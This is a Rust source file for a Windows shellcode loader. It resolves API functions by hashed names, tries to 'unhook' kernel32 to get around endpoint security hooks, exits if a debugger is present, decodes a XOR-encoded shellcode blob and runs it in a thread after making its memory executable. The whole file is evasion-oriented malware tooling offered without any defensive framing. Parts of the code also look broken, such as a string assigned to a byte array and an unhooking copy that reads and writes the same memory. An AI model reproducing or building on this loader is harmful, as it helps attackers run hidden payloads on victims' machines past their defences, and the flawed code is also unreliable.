#![allow(unused_imports)]
#![allow(non_snake_case)]
#![allow(dead_code)]
#![allow(unused_variables)]
#![allow(improper_ctypes_definitions)]
#![windows_subsystem = "windows"]

static POLYMORPHKEY: &[u8] = b"lUHYVL1uUUoy3DRcowyxCw";

use windows::{
    Win32::{
        System::{
            Memory::{MEM_COMMIT, MEM_RESERVE, MEM_RELEASE, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE, VIRTUAL_ALLOCATION_TYPE, VIRTUAL_FREE_TYPE, MEMORY_MAPPED_VIEW_ADDRESS, FILE_MAP, PAGE_READONLY, SEC_IMAGE, FILE_MAP_READ},
            Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_SECTION_HEADER}, 
            Threading::{CreateRemoteThreadEx, PROCESS_ALL_ACCESS, INFINITE, PROCESS_ACCESS_RIGHTS, LPPROC_THREAD_ATTRIBUTE_LIST, LPTHREAD_START_ROUTINE},
            LibraryLoader::LoadLibraryA,
            SystemServices::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, IMAGE_SIZEOF_SECTION_HEADER },
            ProcessStatus::MODULEINFO,
        },
        Foundation::{CloseHandle, BOOL, HMODULE, HANDLE, WAIT_EVENT, GetLastError, GENERIC_READ},
        Security::SECURITY_ATTRIBUTES,
        Storage::FileSystem::{FILE_SHARE_MODE, FILE_CREATION_DISPOSITION, FILE_FLAGS_AND_ATTRIBUTES, FILE_SHARE_READ, OPEN_EXISTING},
    },
    core::{PCSTR, Result},
};
use std::{ptr::{null_mut, null, copy_nonoverlapping}, process, mem, str, slice, os::raw::c_void};

pub type TOpenProcess = unsafe extern "system" fn(
    dwdesiredaccess: PROCESS_ACCESS_RIGHTS,
    binherithandle: BOOL,
    dwprocessid: u32
) -> HANDLE;

pub type TCheckRemoteDebuggerPresent = unsafe extern "system" fn(
    hprocess: HANDLE,
    pbdebuggerpresent: *mut BOOL
) -> ();

pub type TIsDebuggerPresent = unsafe extern "system" fn() -> BOOL;

pub type TVirtualAllocEx = unsafe extern "system" fn(
    hprocess: HANDLE,
    lpaddress: *const c_void,
    dwsize: usize,
    flallocationtype: VIRTUAL_ALLOCATION_TYPE,
    flprotect: PAGE_PROTECTION_FLAGS
) -> *mut c_void;

pub type TCloseHandle = unsafe extern "system" fn(
    hobject: HANDLE
) -> ();

pub type TWriteProcessMemory = unsafe extern "system" fn(
    hprocess: HANDLE,
    lpbaseaddress: *const c_void,
    lpbuffer: *const c_void,
    nsize: usize,
    lpnumberofbyteswritten: *mut usize
) -> ();

pub type TVirtualProtect = unsafe extern "system" fn(
    lpaddress: *const c_void,
    dwsize: usize,
    flnewprotect: PAGE_PROTECTION_FLAGS,
    lpfloldprotect: *mut PAGE_PROTECTION_FLAGS
) -> ();

pub type TVirtualProtectEx = unsafe extern "system" fn(
    hprocess: HANDLE,
    lpaddress: *const c_void,
    dwsize: usize,
    flnewprotect: PAGE_PROTECTION_FLAGS,
    lpfloldprotect: *mut PAGE_PROTECTION_FLAGS
) -> ();

pub type TCreateRemoteThreadEx = unsafe extern "system" fn(
    hprocess: HANDLE,
    lpthreadattributes: *const SECURITY_ATTRIBUTES,
    dwstacksize: usize,
    lpstartaddress: LPTHREAD_START_ROUTINE,
    lpparameter: *const c_void,
    dwcreationflags: u32,
    lpattributelist: *mut c_void,
    lpthreadid: *mut u32
) -> HANDLE;

pub type TWaitForSingleObject = unsafe extern "system" fn(
    hhandle: HANDLE,
    dwmilliseconds: u32
) -> WAIT_EVENT;

pub type TVirtualFree = unsafe extern "system" fn(
    lpaddress: *mut c_void,
    dwsize: usize,
    dwfreetype: VIRTUAL_FREE_TYPE
) -> ();

pub type TGetCurrentProcess = unsafe extern "system" fn() -> HANDLE;

pub type TGetModuleHandleA = unsafe extern "system" fn(
    lpModuleName: PCSTR
) -> HMODULE;

pub type TK32GetModuleInformation = unsafe extern "system" fn(
    hprocess: HANDLE,
    hmodule: HMODULE,
    lpmodinfo: *mut MODULEINFO,
    cb: u32
) -> BOOL;

pub type TCreateFileA = unsafe extern "system" fn(
    lpfilename: PCSTR,
    dwdesiredaccess: u32,
    dwsharemode: FILE_SHARE_MODE,
    lpsecurityattributes: Option<*const SECURITY_ATTRIBUTES>,
    dwcreationdisposition: FILE_CREATION_DISPOSITION,
    dwflagsandattributes: FILE_FLAGS_AND_ATTRIBUTES,
    htemplatefile: HANDLE
) -> HANDLE;

pub type TCreateFileMapping = unsafe extern "system" fn(
    hfile: HANDLE,
    lpfilemappingattributes: Option<*const SECURITY_ATTRIBUTES>,
    flprotect: PAGE_PROTECTION_FLAGS,
    dwmaximumsizehigh: u32,
    dwmaximumsizelow: u32,
    lpname: PCSTR
) -> HANDLE;

pub type TMapViewOfFile = unsafe extern "system" fn(
    hfilemappingobject: HANDLE,
    dwdesiredaccess: FILE_MAP,
    dwfileoffsethigh: u32,
    dwfileoffsetlow: u32,
    dwnumberofbytestomap: usize
) -> MEMORY_MAPPED_VIEW_ADDRESS;

pub type TFreeLibrary = unsafe extern "system" fn(hlibmodule: HMODULE) -> ();

fn getHashFromFunc(funcName: &str) -> u32 {
    let mut hash: u32 = 0x35;

    for c in funcName.chars() {
        hash = (hash.wrapping_mul(0xab10f29f) + c as u32) & 0xffffff;
    }

    hash
}

fn getFuncAddressByHash(lib: &str, hash: Vec<u32>) -> Vec<Option<*const u32>> {
    unsafe {

        let lib_ptr: PCSTR = PCSTR::from_raw(format!("{}\0", lib).as_ptr());
        let libBase: Result<HMODULE> = LoadLibraryA(lib_ptr);
        let mut funcAddresses: Vec<Option<*const u32>> = vec![None; hash.len()];
         
        match libBase {
            Ok(h) => {
                let base_ptr: *const u8 = h.0 as *const u8;
                let img_dos_header: &IMAGE_DOS_HEADER = &*(base_ptr as *const IMAGE_DOS_HEADER);
                let nt_headers_addr = base_ptr.add(img_dos_header.e_lfanew as usize);
                let img_nt_headers: &IMAGE_NT_HEADERS64 = &*(nt_headers_addr as *const IMAGE_NT_HEADERS64);
                let export_directory_RVA: *const u32 = img_nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT.0 as usize].VirtualAddress as *const u32;
                let export_directory_addr = base_ptr.add(export_directory_RVA as usize);
                let img_export_directory: &IMAGE_EXPORT_DIRECTORY = &*(export_directory_addr as *const IMAGE_EXPORT_DIRECTORY);
                let addr_func_RVA: *const u32 = base_ptr.add(img_export_directory.AddressOfFunctions as usize) as *const u32;
                let addr_names_RVA: *const u32 = base_ptr.add(img_export_directory.AddressOfNames as usize) as *const u32;
                let addr_names_ordinals_RVA: *const u16 = base_ptr.add(img_export_directory.AddressOfNameOrdinals as usize) as *const u16;
                let f_num: isize = img_export_directory.NumberOfFunctions as isize;

                for i in 0..f_num {
                    let func_name_RVA: u32 = *addr_names_RVA.offset(i as isize) as u32;
                    let func_name_VA: *const u32 = base_ptr.add(func_name_RVA as usize) as *const u32;

                    let func_name_VA_ptr: *const u8 = func_name_VA as *const u8;
                    let mut len = 0;
                    while *func_name_VA_ptr.add(len) != 0 {
                        len += 1;
                    }

                    let func_name_str: &str = str::from_utf8(slice::from_raw_parts(func_name_VA_ptr, len)).unwrap_or("Error with string");
                    let func_name_hash: u32 = getHashFromFunc(func_name_str) as u32;
                    
                    if let Some(pos) = hash.iter().position(|&h| h == func_name_hash) {
                        let func_addr_RVA: u32 = *addr_func_RVA.offset(*addr_names_ordinals_RVA.offset(i as isize) as isize) as u32;
                        let func_addr: *const u32 = base_ptr.add(func_addr_RVA as usize) as *const u32;
                        println!("[i] Address of {} : {:?} / RVA : {:?}", func_name_str, func_addr, func_addr_RVA);

                        funcAddresses[pos] = Some(func_addr);
                    }
                    
                }

                funcAddresses

            },

            Err(e) => process::exit(-1),
        }
    }
}

fn dllUnhooking(lib: &str, libPath: &str) {

    println!("{:#x}", getHashFromFunc("FreeLibrary"));
    unsafe {
        println!("[+] DLL UnHooking");
        let hashK32: Vec<u32> = vec![0x6246f7, 0x3b40ac, 0xca9eb4, 0xc6780, 0xe23e3f, 0x7857d9, 0xbdd9cb, 0x6174ba];
        let adressesK32: Vec<Option<*const u32>> = getFuncAddressByHash("kernel32.dll", hashK32);

        if adressesK32.contains(&None) {
            process::exit(-1);
        }

        let hashPsapi: Vec<u32> = vec![0xe1d9bf];
        let adressesPsapi: Vec<Option<*const u32>> = getFuncAddressByHash("psapi.dll", hashPsapi);

        if adressesPsapi.contains(&None) {
            process::exit(-1);
        }

        let XGetCurrentProcess: TGetCurrentProcess = mem::transmute(adressesK32[0].unwrap() as *const u32);
        let XGetModuleHandleA: TGetModuleHandleA = mem::transmute(adressesK32[1].unwrap() as *const u32);
        let XGetModuleInformation: TK32GetModuleInformation = mem::transmute(adressesPsapi[0].unwrap() as *const u32);
        let XCreateFileA: TCreateFileA = mem::transmute(adressesK32[2].unwrap() as *const u32);
        let XCreateFileMapping: TCreateFileMapping = mem::transmute(adressesK32[3].unwrap() as *const u32);
        let XMapViewOfFile: TMapViewOfFile = mem::transmute(adressesK32[4].unwrap() as *const u32);
        let XVirtualProtect: TVirtualProtect = mem::transmute(adressesK32[5].unwrap() as *const u32);
        let XCloseHandle: TCloseHandle = mem::transmute(adressesK32[6].unwrap() as *const u32);
        let XFreeLibrary: TFreeLibrary = mem::transmute(adressesK32[7].unwrap() as *const u32);

        let process: HANDLE = XGetCurrentProcess();
        let mi: MODULEINFO = Default::default();
        let lib_ptr: PCSTR = PCSTR::from_raw(format!("{}\0", lib).as_ptr());
        let libModule: HMODULE = XGetModuleHandleA(lib_ptr);

        XGetModuleInformation(process, libModule, &mi, mem::size_of::<MODULEINFO>() as u32);
        let libBase: *mut c_void = mi.lpBaseOfDll;
        let libPath_ptr: PCSTR = PCSTR::from_raw(format!("{}\0", lib).as_ptr());
        let libFile: HANDLE = XCreateFileA(libPath_ptr, GENERIC_READ, FILE_SHARE_READ, null(), OPEN_EXISTING, 0, null());
        let libMapping: HANDLE = XCreateFileMapping(libFile, null(), PAGE_READONLY | SEC_IMAGE, 0, 0, null());
        let libMappingAddress = XMapViewOfFile(libMapping, FILE_MAP_READ, 0, 0, 0);

        let hookedDosHeader: &IMAGE_DOS_HEADER = &*(libBase as *const IMAGE_DOS_HEADER);
        let hookedNtHeader: &IMAGE_NT_HEADERS64 = &*(libBase.add(hookedDosHeader.e_lfanew as usize));

        for i in 0..hookedNtHeader.FileHeader.NumberOfSections {
            let hookedSectionHeader: &IMAGE_SECTION_HEADER = &*(hookedNtHeader.add(IMAGE_SIZEOF_SECTION_HEADER * i));

            let t: [u8; 8] = ".text";
            if hookedSectionHeader.Name == t {
                let mut oldprotect: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS(0);
    
                XVirtualProtect(
                    libBase.add(hookedSectionHeader.VirtualAddress),
                    hookedSectionHeader.Misc.VirtualSize,
                    PAGE_EXECUTE_READWRITE,
                    &mut oldprotect,
                );

                let dest = libBase.add(hookedSectionHeader.VirtualAddress as usize) as *mut u8;
                let src = libBase.add(hookedSectionHeader.VirtualAddress as usize) as *const u8;
                let size = hookedSectionHeader.Misc.VirtualSize as usize;

                copy_nonoverlapping(src, dest, size);

                XVirtualProtect(
                    libBase.add(hookedSectionHeader.VirtualAddress),
                    hookedSectionHeader.Misc.VirtualSize,
                    oldprotect,
                    &mut oldprotect,
                );
            }
        }

        let _ = XCloseHandle(process);
        let _ = XCloseHandle(libFile);
        let _ = XCloseHandle(libMapping);
        let _ = XFreeLibrary(libModule);
        println!("[-] DLL UnHooking");

    }
}

fn main() {

    dllUnhooking("kernel32.dll", "C:\\Windows\\System32\\kernel32.dll");

    let raw_shellcode: &[u8] = &[0x52, 0x2b, 0xc8, 0x7f, 0x52, 0x91, 0x58,
                             0x7a, 0x52, 0x91, 0x6a, 0x02, 0x52, 0x91, 
                             0x6c, 0x3a, 0x56, 0x91, 0x14, 0x57, 0x91, 
                             0x13, 0x57, 0x91, 0x53, 0x3a, 0xf1, 0x79, 
                             0x5b, 0x91, 0x53, 0x26, 0x57, 0x2b, 0xe5, 
                             0x5b, 0xad, 0x92, 0x57, 0x1b, 0xd5, 0x53, 
                             0x1b, 0xd5, 0x5f, 0x91, 0x25, 0x57, 0x1b, 
                             0xd5, 0x5b, 0x91, 0x55, 0x02, 0x5f, 0x91, 
                             0x6d, 0x3a, 0x57, 0x1b, 0xd4, 0xf9, 0x25, 
                             0xe5, 0xd3, 0x52, 0x2b, 0xec, 0x5b, 0x91, 
                             0x2e, 0x94, 0x56, 0x1b, 0xd4, 0x52, 0x2b, 
                             0xda, 0x52, 0x2b, 0xc8, 0xe6, 0xb6, 0x9e, 
                             0xda, 0x6e, 0x1d, 0xdb, 0xd0, 0x17, 0x1b, 
                             0xd8, 0xf1, 0xee, 0x5e, 0x23, 0xd8, 0x6f, 
                             0xc0, 0x5f, 0x91, 0x4d, 0x3e, 0x57, 0x1b, 
                             0xd0, 0x5b, 0x15, 0xad, 0x16, 0x50, 0x5f, 
                             0x91, 0x45, 0x06, 0x57, 0x1b, 0xd1, 0x5b, 
                             0x91, 0x1e, 0x91, 0x56, 0x1b, 0xd2, 0xd9, 
                             0xd9, 0x5b, 0xa2, 0x82, 0xe4, 0x90, 0x14, 
                             0xf2, 0x88, 0xe5, 0xe5, 0xe5, 0x52, 0x2b, 
                             0xd3, 0x4b, 0x52, 0xa3, 0x79, 0x7b, 0x76, 
                             0x79, 0x34, 0x7f, 0x62, 0x7f, 0x4b, 0x52, 
                             0x97, 0x16, 0x3e, 0x52, 0x2b, 0xc8, 0x52, 
                             0xe5, 0xd8, 0x52, 0x99, 0xf6, 0x32, 0xe5, 0xca];

    let shellcode: Vec<u8> = raw_shellcode.iter().map(|&byte| byte ^ 0x1a).collect();

    let pid = process::id();

    unsafe {        

        let hash: Vec<u32> = vec![0x9e08d0, 0x8dd921, 0xf4ed1b, 0x4fd152, 0xa48f46, 0xc4edec, 0x857934, 0x397566, 0xbdd9cb, 0x675a2];

        let adresses: Vec<Option<*const u32>> = getFuncAddressByHash("kernel32.dll", hash);

        if adresses.contains(&None) {
            process::exit(-1);
        }
        
        let XOpenProcess: TOpenProcess = mem::transmute(adresses[0].unwrap() as *const u32);
        let XCheckRemoteDebuggerPresent: TCheckRemoteDebuggerPresent = mem::transmute(adresses[1].unwrap() as *const u32);
        let XIsDebuggerPresent: TIsDebuggerPresent = mem::transmute(adresses[2].unwrap() as *const u32);
        let XVirtualAllocEx: TVirtualAllocEx = mem::transmute(adresses[3].unwrap() as *const u32);
        let XWriteProcessMemory: TWriteProcessMemory = mem::transmute(adresses[4].unwrap() as *const u32);
        let XVirtualProtectEx: TVirtualProtectEx = mem::transmute(adresses[5].unwrap() as *const u32);
        let XCreateRemoteThreadEx: TCreateRemoteThreadEx = mem::transmute(adresses[6].unwrap() as *const u32);
        let XWaitForSingleObject: TWaitForSingleObject = mem::transmute(adresses[7].unwrap() as *const u32);
        let XCloseHandle: TCloseHandle = mem::transmute(adresses[8].unwrap() as *const u32);
        let XVirtualFree: TVirtualFree = mem::transmute(adresses[9].unwrap() as *const u32);

        
        let hprocess = XOpenProcess(PROCESS_ALL_ACCESS, false.into(), pid);

        let mut debugger_present: BOOL = BOOL(0);

        let _ = XCheckRemoteDebuggerPresent(hprocess, &mut debugger_present as *mut BOOL);
        if debugger_present.as_bool() {
            process::exit(-1);
        }

        if XIsDebuggerPresent().as_bool(){
            process::exit(-1);
        }

        let haddr = XVirtualAllocEx(
            hprocess,
            null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if haddr.is_null() {
            let _ = CloseHandle(hprocess);
            process::exit(-1)
        }

        XWriteProcessMemory(
            hprocess,
            haddr, 
            shellcode.as_ptr() as _,
            shellcode.len(),
            null_mut(),
        );

        let mut oldprotect: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS(0);
    
        XVirtualProtectEx(
            hprocess,
            haddr,
            shellcode.len(),
            PAGE_EXECUTE_READWRITE,
            &mut oldprotect,
        );
        
        //println!("Last Error : {:?}", GetLastError());

        /* let hthread = XCreateRemoteThreadEx(
            hprocess,
            null(),
            0,
            std::mem::transmute(haddr),
            null(),
            0,
            null_mut(),
            null_mut(),
        ); */

        let hthread = CreateRemoteThreadEx(
            hprocess,
            Some(null()),
            0,
            Some(std::mem::transmute(haddr)),
            Some(null()),
            0,
            None,
            Some(null_mut()),).unwrap_or_else(|e| {
                let _ = CloseHandle(hprocess);
                process::exit(-1);
            }
        );

        
        XWaitForSingleObject(hthread, INFINITE);

        let _ = XCloseHandle(hthread);
        let _ = XCloseHandle(hprocess);
        let _ = XVirtualFree(haddr, 0, MEM_RELEASE);
    }
}